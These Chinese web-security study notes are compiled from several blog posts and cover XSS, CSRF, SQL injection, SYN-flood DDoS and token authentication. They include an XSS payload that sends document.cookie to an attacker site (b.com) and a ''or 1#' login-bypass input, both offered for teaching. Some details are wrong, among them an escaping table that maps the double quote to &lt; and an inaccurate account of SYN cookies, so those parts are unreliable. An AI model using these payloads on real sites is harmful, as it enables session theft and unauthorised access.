xss攻击
一、简介
xss又称css(Cross SiteScript)，跨站脚本攻击。
有一些标签是可以在浏览器渲染页面的时候可以执行脚本的，比如script，img，iframe等等。如果在这些标签里加入一些可以获取用户信息或者其他不能被暴露出来的信息的脚本。如：盗取用户cookie，破快页面结构，重定向到其他网站等。
XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种：
一种是DOM Based XSS漏洞，一种是stored XSS漏洞。理论上，所有可输入的地方，没有对输入数据进行处理的话，都会存在xss漏洞。漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script
二、攻击分类
1、DOM Based XSS
DOM Based XSS是一种基于网页DOM结构的攻击，该攻击的特点是中招的是少数人
场景一：
当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：
<html>
	<head>
			<title>XSS测试</title>         
	</head>
	<body>
			页面内容：<%=request.getParameter("content")%>
	</body>
</html>
我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open("www.b.com?param="+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息cookie信息中可能存有登录密码，攻击成功！受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？
2、stored XSS
Stored XSS是存储式的XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。
a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。
Stored XSS漏洞危害性更大，危害面更广。
三、防御
法一：
永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉
法二
假如某些情况下，我们不能对用于输入的数据进行严格的过滤，那么我们也需要对标签进行转换，自定义一个函数进行转换。
< → &lt;
> → &gt;
& → &amp;
" → &lt;
  → &nbsp;
法三、或者使用js的转码，encodeURI和encodeURIComponent

csrf攻击
对于常规的Web攻击手段，如XSS、csrf、SQL注入（常规的不包括文件上传漏洞、DDoS攻击）等，防范措施比较容易，对症下药即可。比如
	XSS的防范需要转义掉输入的尖括号，
	防止CRSF攻击需要将cookie设置为httponly，以及增加session相关的Hash token码
	SQL注入的防范需要将分号等字符转义
做起来虽然简单，但是却容易被忽略，更多的是需要从开发流程予以保障，以免因为人为的疏忽而造成损失。
一、csrf介绍
CSRF攻击的全称是跨站请求伪造(cross site request forgery)，是一种对网站的恶意利用；尽管听起来跟XSS跨站脚本攻击有点相似，但事实上CSRF与XSS差别很大。
XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站
你可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求，CRSF能做的事情包括利用你的身份发邮件、发短信、进行交易转账等，甚至盗取你的账号。
二、csrf攻击原理
1、首先用户C浏览并登录了受信任站点A；
2、登录信息验证通过以后，站点A会在返回给浏览器的信息中带上已登录的cookie，cookie信息会在浏览器端保存一定时间（根据服务端设置而定）
3、完成这一步以后，用户在没有登出（清除站点A的cookie）站点A的情况下，访问恶意站点B
4、这时恶意站点 B的某个页面向站点A发起请求，而这个请求会带上浏览器端所保存的站点A的cookie
5、站点A根据请求所带的cookie，判断此请求为用户C所发送的
因此，站点A会报据用户C的权限来处理恶意站点B所发起的请求，而这个请求可能以用户C的身份发送 邮件、短信、消息，以及进行转账支付等操作，这样恶意站点B就达到了伪造用户C请求站点 A的目的
简单来说：受害者只需要做下面两件事情，攻击者就能够完成CSRF攻击
	登录受信任站点 A，并在本地生成cookie；
	在不登出站点A（清除站点A的cookie）的情况下，访问恶意站点B
三、第一方和第三方cookie概念
cookie是域服务器存储在浏览器中的一小段数据块，只能被这个域访问，谁设置谁访问。
第一方Cookie：比如，访问a网站，这个网站设置了一个Cookie，这个Cookie也只能被a.com这个域下的网页读取
第三方Cookie：比如，访问a网站，网页里有用到b网站的一张图片，浏览器在b网站请求图片的时候，b网站设置了一个Cookie，那这个Cookie只能被b网站访问，反而不能被a网站访问。因为对我们来说，我们实际是在访问a这个网站被设置了一个b域下的Cookie，所以叫第三方Cookie。
四、csrf防御
CSRF的防御可以从服务端和客户端两方面着手：，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。
1、服务端进行CSRF防御
服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。
(1).Cookie Hashing(所有表单都包含同一个伪随机值)：
这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了。
<?php
	//构造加密的Cookie信息
	$value ="DefenseSCRF";
	setcookie(”cookie”, $value, time()+3600);
?>
在表单里增加hash值，以认证这确实是用户发送的请求。


csrf攻击防御的重点是利用cookie的值只能被第一方读取，无法读取第三方的cookie值。
预防csrf攻击简单可行的方法就是在客户端网页上再次添加一个cookie，保存一个随机数。而用户访问的时候，先读取这个cookie值，hash一下这个cookie值并发送给服务器，服务器收到用户的hash之后的值，同时取出之前设置在用户端的cookie的值，用同样的算法hash这个cookie值，比较两个hash值，相同则是合法。（如果用户访问了病毒网站，也想带这个cookie去访问的时候吗，此时，因为病毒网站无法获取第三方cookie的值，所以他也就无法hash这个随机数，所以也就会被服务器校验的过滤掉）


1、尽量使用post请求，因为get请求可以被浏览器直接访问，太容易被利用。如果是get请求，别人就可以用img的src直接请求你这个链接。因为src具有跨域性，所以就会被访问。
2、加入验证码，攻击者攻击就是伪造这次请求。我们可以加入验证码，让用户每次请求之前验证一下，短信验证码，或者是图滑动。这样就可以知道这是用户行为还是黑客行为，除非黑客能够破解这个验证。一般来说，简单的可以破解，但是现代的验证码基本没办法破解。
3、验证referer。http的头上有个字段叫做Referer，它能够记录当前一次请求的来源地址。后台判断如果当前refer字段的值并不是用户网页，就会拒绝这次请求。（但是并不是绝对安全，如果黑客在发送请求之前篡改refer的值，就相当于跳过了验证）
4、anti csrf token。csrf请求之所以可以伪造成功，是因为黑客可以完全伪造用户的请求，在这次请求中，用户的信息实际上是存在cookie中的，所以黑客可以利用cookie直接跳过安全验证。我们要防御csrf，关键在于在请求时，黑客不能伪造这个信息。并且这个信息不存在于cookie中，所以我们就可以通过在http请求中，或者头信息中加入一个随机产生的token，这个token存在服务端，通过拦截器验证这个token，如果请求中没有这个token，或者这个token不是正确的，就拒绝这次请求。一般token放在head标签内或者form表单内。token每次都会变。服务端生成token后，把这个token放在session里面，或者放在noseeko的缓存中，然后在post提交的时候，就会将这个token带给服务端，服务端验证如果存在且相等，就验证通过。token验证后就会销毁掉
5、加入自定义的header
	产生一个随机的token，一定要保证token的保密性和随机性。

	三、网络劫持攻击
	很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以截获该用户收发的所有数据，这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。
	如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密--即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。
	四、控制台注入代码
　　不知道各位看官有没有注意到天猫官网控制台的警告信息，如图4.1所示，这是为什么呢?因为有的黑客会诱骗用户去往控制台里面粘贴东西(欺负小白用户不懂代码)，比如可以在朋友圈贴个什么文章，说:"只要访问天猫，按下F12并且粘贴以下内容，则可以获得xx元礼品"之类的，那么有的用户真的会去操作，并且自己隐私被暴露了也不知道。
　　天猫这种做法，也是在警告用户不要这么做，看来天猫的前端安全做的也是很到位的。不过，这种攻击毕竟是少数，所以各位看官看一眼就行，如果真的发现有的用户会被这样攻击的话，记得想起天猫的这种解决方案。
五、钓鱼
　　钓鱼也是一种非常古老的攻击方式了，其实并不太算前端攻击。可毕竟是页面级别的攻击，我们也来一起聊一聊。我相信很多人会有这样的经历，QQ群里面有人发什么兼职啦、什么自己要去国外了房子车子甩卖了，详情在我QQ空间里啦，之类的连接。打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。
　　其实这种方式，在前端也有利用。下面，我们就来试试如果利用前端进行一次逼真的钓鱼。
　　1 首先，我们在xx空间里分享一篇文章，然后吸引别人去点击。
　　2 接着，我们在cheat.php这个网站上面，将跳转过来的源网页地址悄悄的进行修改。
　　于是，在用户访问了我们的欺骗网站后，之前的tab已经悄然发生了变化，我们将其悄悄的替换为了钓鱼的网站，欺骗用户输入用户名、密码等。
　　3 我们的钓鱼网站，伪装成XX空间，让用户输入用户名与密码
　　这种钓鱼方式比较有意思，重点在于我们比较难防住这种攻击，我们并不能将所有的页面链接都使用js打开。所以，要么就将外链跳转的连接改为当前页面跳转，要么就在页面unload的时候给用户加以提示，要么就将页面所有的跳转均改为window.open，在打开时，跟大多数钓鱼防治殊途同归的一点是，我们需要网民们的安全意识提高。
　　六、我们平时开发要注意些什么?
　　开发时要提防用户产生的内容，要对用户输入的信息进行层层检测要注意对用户的输出内容进行过滤(进行转义等)重要的内容记得要加密传输(无论是利用https也好，自己加密也好)
　　get与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。
　　对于URL上携带的信息，要谨慎使用。心中时刻记着，自己的网站哪里可能有危险。

CSRFTester工具
CSRF漏洞检测工具的测试原理如下：
使用CSRFTester进行测试时，                    
首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受

防御csrf攻击
目前防御 CSRF 攻击主要有三种策略：
验证 HTTP Referer 字段；
（1）在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。
	根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。

	这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。

	然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。

即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。

（2）在请求地址中添加 token 并验证
	CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
	这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。
	对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 <input type=”hidden” name=”csrftoken” value=”tokenvalue”/>，这样就把 token 以参数的形式加入请求了
	在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。
	该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。
	（3）在 HTTP 头中自定义属性并验证
	这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去
	然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并0非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。
	2、将cookie设置为HttpOnly
CRSF攻击很大程度上是利用了浏览器的cookie，为了防止站内的XSS漏洞盗取cookie,需要在cookie中设置“HttpOnly”属性，这样通过程序（如JavaScript脚本、Applet等）就无法读取到cookie信息，避免了攻击者伪造cookie的情况出现。
在Java的Servlet的API中设置cookie为HttpOnly的代码如下：
response.setHeader( "Set-Cookie", "cookiename=cookievalue;HttpOnly");

SQL注入简介
SQL注入是网站存在最多也是最简单的漏洞，主要原因是程序员在开发用户和数据库交互的系统时没有对用户输入的字符串进行过滤，转义，限制或处理不严谨，导致用户可以通过输入精心构造的字符串去非法获取到数据库中的数据。

一般用户登录用的SQL语句为：SELECT * FROM user WHERE username='admin' AND password='passwd'，此处admin和passwd分别为用户输入的用户名和密码，如果程序员没有对用户输入的用户名和密码做处理，就可以构造万能密码成功绕过登录验证，如用户输入'or 1#,SQL语句将变为：SELECT * FROM user WHERE username=''or 1#' AND password=''，‘’or 1为TRUE，#注释掉后面的内容，所以查询语句可以正确执行。我们可以使用DVWA来测试一下

对用户输入进行转义可以防止sql注入

一、DDOS攻击简介：
DDOS又称为分布式拒绝服务攻击，全称是Distributed Denial os Service。DDOS本是利用合理的请求造成资源过载，导致服务不可用。
分布式拒绝服务攻击，将正常请求放大了若干倍，通过若干网络节点同时发起攻击，以达成规模响应。这些网络节点往往是黑客们所控制的“肉鸡”，数量达到一定规模后，就形成了一个“僵尸网络”。大型的僵尸网络，甚至达到了数万、数十万台的规模。如此规模的僵尸网络发起的DDOS攻击，几乎是不可阻挡的。
常见的DDOS攻击有SYN flood、UDP flood、ICMP flood等。其中SYN flood是一种最为经典的DDOS攻击，其发现于1996年，但是至今仍然保持着非常强大的生命力。SYN flood如此猖獗是因为它利用了TCP协议设计中的缺陷，而TCP/IP协议是整个互联网的基础，牵一发而动全身，如今想要修复这样的缺陷几乎成为不可能的事情。
1)客户端向服务器发送一个SYN包，包含客户端使用的端口号和初始序列号x

(2)服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号x+1和服务器端的初始序列号y；

(3)客户端收到服务器端返回的SYN+ACK报文后，向服务器端返回一个确认号为y+1、序号为x+1的ACK报文，一个标准的TCP连接完成。
而SYN flood在攻击时，首先伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址时伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3-5次并且等待一个SYN Time(一般为30秒至2分钟)，如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务端将会消耗非常多的资源(CPU和内存)来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试，最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。

对抗SYN flood的主要措施有SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。

在很多对抗DDOS的产品中，一般会综合使用各种算法，结合一些DDOS攻击的特征，对流量就行清洗，对抗DDOS的网络设备可以串联或者并联在网络出口处。

但是DDOS仍然是业界的一大难题，当攻击流量超过了网络设备，甚至带宽的最大负荷时，网络仍将瘫痪。一般来说，大型网站之所以看起来比较能“抗”DDOS攻击，是因为大型网站的带宽比较充足，集群内服务器的数量也比较多。但一个集群的资源毕竟是有限的，在实际的攻击中，DDOS的流量甚至可以达到数G到几十G，遇到这种情况，只能与网络运营商合作，共同完成DDOS攻击的响应


Vue项目中实现用户登录及token验证:
在前后端完全分离的情况下，Vue项目中实现token验证大致思路如下：
1、第一次登录的时候，前端调后端的登陆接口，发送用户名和密码
2、后端收到请求，验证用户名和密码，验证成功，就给前端返回一个token
3、前端拿到token，将token存储到localStorage和vuex中，并跳转路由页面
4、前端每次跳转路由，就判断 localStroage 中有无 token ，没有就跳转到登录页面，有则跳转到对应路由页面
5、每次调后端接口，都要在请求头中加token
6、后端判断请求头中有无token，有token，就拿到token并验证token，验证成功就返回数据，验证失败（例如：token过期）就返回401，请求头中没有token也返回401
7、如果前端拿到状态码为401，就清除token信息并跳转到登录页面

三、CSRF的防御策略：token认证
1、token 产生
Token是在服务端产生的。用户输入用户名和密码发送认证请求，如果服务端认证成功，那么会返回token给前端。前端每次请求的时候带上token来证明自己的合法地位。如果Token在服务端持久化，那他就是一个永久的身份令牌。
2、可以解决哪些问题
	Token 完全由应用管理，所以它可以避开同源策略
	Token 可以避免 CSRF 攻击
	Token 可以是无状态的，可以在多个服务间共享
	用途：用户输入账号、密码通过基本认证后，服务端认颁发授权token（包含用户ID等基本信息）用作认证令牌
	原理：任何请求，都附带token；服务端根据token判断请求是否合法。
	缺点：如果报文在中途被劫持，那么token就泄露了，这时（token有效期内）黑客就可以构造任意的请求了
3、token验证方法
要抵御csrf，关键在于请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是scrf攻击而拒绝这次请求。
4、读取token的方法
token可以在用户登录后产生，并放于session中，然后每次验证的时候把token从session中拿出来，与请求中的token进行比较。这种方法难点在于如何把token以参数的形式加入请求。
对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成http://url?csrftoken=tokenvalue。
而对于 POST 请求来说，要在 form 的最后加上 <input type='hidden' name='csrftoken' value='tokenvalue'/>，这样就把 token 以参数的形式加入请求了
5、Token 设置有效期
使用 Refresh Token。这种方法中，服务端不需要刷新 Token 的过期时间，一旦 Token 过期，就反馈给前端，前端使用 Refresh Token 申请一个全新 Token 继续使用。这种方法中，服务端只需要在客户端请求更新 Token 的时候对 Refresh Token 的有效性进行一次检查，大大减少了更新有效期的操作，也就避免了频繁读写。当然 Refresh Token 也是有有效期的，但是这个有效期就可以长一点了，比如，以天为单位的时间。
6、token如何避免被截获
请求的时候，将token一起发送给后台。但这和单一的id没有什么区别，任何人都可以通过抓包伪造。所以就需要签名。通过算法，将用户id外加token值生成一个签名。（token，令牌，代表执行某些操作的权利的对象，会话令牌，交互会话中唯一的身份标识。）
具体流程。
打开修改用户个人信息页面，web浏览器访问对应的php文件。
网页接受从后台发过来的token,类型不可见。将其一并提交给后台进行验证。每次刷新，后台发送过来的token都不一样。也就起到了防止伪造的作用

如何实现单点登录
1、session会话
http协议是无状态的，浏览器的每一次请求，服务器会单独处理，不与之前或者之后的请求产生关联。为了标识身份，就有了会话机制。浏览器第一次请求服务器，服务器会创建一个会话，并将此会话的id作为响应的一部分发送给浏览器。浏览器存储会话，并在每次的请求中带上会话id，服务器取得请求中的会话id就知道是不是同一个用户了。
这样后续请求就与第一次请求产生关联，服务器在内存中保存会话id。浏览器保存在cookie中。
2、单点登录
	
单点登录全称Single Sign On 简称为SSO，是指在多系统应用群中登录一个系统，便可在其他所有系统中得到授权而无需再次登录，包含单点登录和单点注销两部分。
相比于单系统登录，sso需要一个独立的认证中心，只有认证中心能接受用户的用户名密码等安全信息，其他系统不提供登陆入口，只接受认证中心的间接授权。间接授权通过令牌实现，sso认证中心验证用户的用户名密码没问题，创建授权令牌。在接下来的跳转过程中，令牌作为参数发送给各个子系统，子系统拿到令牌，可以借此创建局部会话，局部会话登录方式与单系统的方式相同
https://blog.csdn.net/mashaokang1314/article/details/88993760
	1、登录，见博客
	2、注销
3、部署图
单点登录涉及sso认证中心与众子系统，子系统与sso认证中心需要通信以交换令牌，校验令牌及发起注销请求，因而子系统必须集成sso的客户端，sso认证中心则是sso服务端，整个单点登录过程实质上是sso客户端与服务端通信的过程。



客户端传过来的token，服务端怎么判断token是否正确？
第一步服务端要生成Token值，自己编写的生成随机字符串，第二步我们将生成的token作为Redis缓存的键来存储，我们可以在Redis缓存里面设置token过期的时间。第三步也是我们经常要做的，对token进行验证，判断当前token是否有效

可以直接放在Redis里面，然后客户端传过来就看Redis里面有没有，不过要考虑会不会雪崩，
或者与客户端用同一套签名算法

token分为三部分，中间用分隔符分开，以jwt为例，第一部分是token加密方式，第二部分是载体，保存的登录相关信息，第三部分是使用私钥加密后的字符串，每一部分又通过base64编码，token后端不需要保存，每次请求通过重新加密载体和第三部分对比验证是否被篡改。
https://blog.csdn.net/qq_42109746/article/details/90732543?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control

token的使用
1.创建：token 的实质其实就是一个唯一标识的字符串，一般来说由UUID生成，或者一些复杂的可以由时间戳或者用户的ID根据某一算法进行加密生成，取到token之后再进行解密，取出用户的ID。我这里以简单的UUID进行举例：
String token = UUID.randomUUID().toString();
2.保存：很多常见的做法是将token保存进数据库或者缓存，但是放进数据库会严重消耗服务器资源，所以本人不建议这样做，我比较喜欢把token 存进redis缓存里，最主要的好处就是简单易操作，还大大加快了数据查询速度，我把 redis 理解为一张庞大的Map 表。
3.将 token 添加到响应头
response.setHeader("Access-Control-Expose-Headers","Cache-Control,Content-Type,Expires,Pragma,Content-Language,Last-Modified,token");
response.addHeader("token", token);
4.从请求头里取出token
response.getHeader("token");

关于JWT的token，如果被截取了
首先这不是JWT的问题，而是http通讯的安全问题，总所周知http是采用的明文通讯，所以很容易就能够被窃取到http通讯报文。现在网站大多是http通讯，那也都面临着cookie被截取的问题，JWT同理

解决办法：
采用https 或者 代码层面也可以做安全检测，比如ip地址发生变化，MAC地址发生变化等等，可以要求重新登录



1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。
2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。
3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。

https://www.cnblogs.com/moyand/p/9047978.html



